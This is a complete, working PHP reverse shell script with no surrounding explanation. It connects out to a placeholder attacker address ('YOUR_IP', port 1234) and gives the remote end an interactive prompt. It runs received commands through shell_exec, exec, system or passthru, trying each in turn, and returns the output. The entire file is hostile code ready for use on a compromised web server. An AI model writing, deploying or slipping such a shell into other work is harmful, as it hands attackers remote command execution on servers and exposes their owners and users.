<?php
set_time_limit(0);
$ip = "YOUR_IP";  // Replace with your IP
$port = 1234;     // Replace with your port

$socket = fsockopen($ip, $port);
if (!$socket) {
    die("Connection failed.");
}

fwrite($socket, "Connected to Reverse Shell\n");

function execute_command($cmd) {
    $output = "";
    if (function_exists("shell_exec")) {
        $output = shell_exec($cmd . " 2>&1");
    } elseif (function_exists("exec")) {
        exec($cmd . " 2>&1", $out);
        $output = implode("\n", $out);
    } elseif (function_exists("system")) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
    } elseif (function_exists("passthru")) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_clean();
    } else {
        $output = "No function available to execute commands.";
    }
    return $output;
}

// Function to execute command and show output
function interactive_shell($socket) {
    // Set default working directory for the shell prompt
    $cwd = getcwd();
    
    while (true) {
        // Print the current working directory in the prompt
        fwrite($socket, $cwd . "> ");
        
        // Get command input
        $cmd = trim(fgets($socket, 2048));
        
        // If the command is 'exit', break the loop
        if ($cmd === "exit") {
            break;
        }
        
        // Change directory command handler
        if (substr($cmd, 0, 3) === "cd ") {
            $dir = substr($cmd, 3);
            if (chdir($dir)) {
                $cwd = getcwd();
                fwrite($socket, "Changed directory to $cwd\n");
            } else {
                fwrite($socket, "Directory not found: $dir\n");
            }
        } else {
            // Execute the command and return output
            $output = execute_command($cmd);
            fwrite($socket, $output);
        }
    }
}

interactive_shell($socket);

fclose($socket);
?>
